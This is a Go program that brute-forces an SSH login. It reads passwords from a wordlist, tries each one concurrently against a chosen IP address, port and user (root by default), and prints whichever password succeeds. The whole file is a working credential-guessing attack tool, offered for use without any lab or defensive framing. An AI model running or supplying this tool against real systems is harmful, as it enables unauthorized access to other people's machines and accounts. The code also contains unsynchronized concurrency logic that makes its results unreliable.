/*
golang program to find a password for a ssh user using a large wordlist file.
TODO: add args to check if the ip is down and create a results file.
*/
package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	inittime     = time.Now()
	passwordfile = flag.String("file", "wordlistfile.txt", "indicate wordlist file to use")
	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
	port         = flag.Int("port", 22, "indicate port to brute force")
	user         = flag.String("user", "root", "indicate user to brute force")
	timer        = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
)

// Define fileScanner with methods
type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func NewFileScanner() *fileScanner {
	return &fileScanner{}
}

func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}

func (f *fileScanner) Close() error {
	return f.File.Close()
}

func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}
	return f.Scanner
}

// Define ssh Dialer with methods
type Dialer struct {
	password string
	err      error
}

func NewDialer() *Dialer {
	d := &Dialer{}
	return d
}

func sshdialer(password string, ch chan Dialer) {
	salida := NewDialer()
	config := &ssh.ClientConfig{
		User: *user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: *timer,
	}
	//Create dial
	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
	if err != nil {
		fmt.Printf("Failed: %s ---", password)
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	}
	salida.password, salida.err = password, err
	ch <- *salida
}

func printUsedValues() {
	fmt.Println("file:", *passwordfile)
	fmt.Println("ip:", *ip)
	fmt.Println("port:", *port)
	fmt.Println("user:", *user)
	fmt.Println("timer:", timer)
	fmt.Println("additional args:", flag.Args())
}

// var to test when you find the password
var found bool

func main() {
	flag.Parse()
	printUsedValues()
	ch := make(chan Dialer)
	fscanner := NewFileScanner()
	err := fscanner.Open(*passwordfile)
	if err != nil {
		fmt.Println("error in open file step: ", err.Error())
	} else {
		scanner := fscanner.GetScan()
		for scanner.Scan() {
			password := scanner.Text()
			go sshdialer(password, ch)
			// Don´t set this time lower, you need to have a proper time to get a response
			// the response time depends in several factors, it may work with 120 Milliseconds
			// but sometimes bypass the correct password.
			time.Sleep(*timer)
			go func() {
				for x := range ch {
					if x.err != nil {
						fmt.Printf(".")
					} else {
						fmt.Println("Done!!!!, your password is: ", x.password)
						found = true
						return
					}
				}
			}()
			if found == true {
				break
			}
		}
	}
	fscanner.Close()
}
